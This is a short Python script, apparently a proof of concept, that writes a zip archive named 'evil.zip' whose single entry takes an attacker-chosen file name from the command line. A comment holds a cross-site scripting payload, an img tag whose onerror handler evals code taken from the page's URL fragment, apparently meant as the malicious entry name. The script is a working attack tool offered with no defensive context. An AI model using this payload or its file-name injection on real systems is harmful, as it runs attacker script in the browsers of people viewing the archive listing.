#!/usr/bin/python
import sys
import zipfile

# <img src=a onerror=eval(decodeURI(location.hash.substr(1)));>
if len(sys.argv) != 2:
  sys.exit("usage: evilname.py <whatever>")

with zipfile.ZipFile('evil.zip', 'w') as z:
  z.writestr(sys.argv[1], "whatever")

